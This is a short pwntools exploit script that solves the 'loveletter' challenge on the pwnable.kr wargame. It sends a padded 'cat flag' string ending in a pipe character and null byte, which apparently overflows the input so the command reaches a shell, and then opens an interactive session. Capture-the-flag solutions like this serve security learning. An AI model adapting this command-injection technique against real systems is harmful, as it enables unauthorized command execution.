from pwn import *

exe = ELF("./loveletter", checksec=True)

context.binary = exe

HOST = "pwnable.kr"
PORT = 10030

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

CMD = b"cat flag"

def main():
    r  = conn()
    r.sendline(CMD + b" " * (253 - len(CMD)) + b"|\x00")
    r.interactive()

if __name__ == "__main__":
    main()
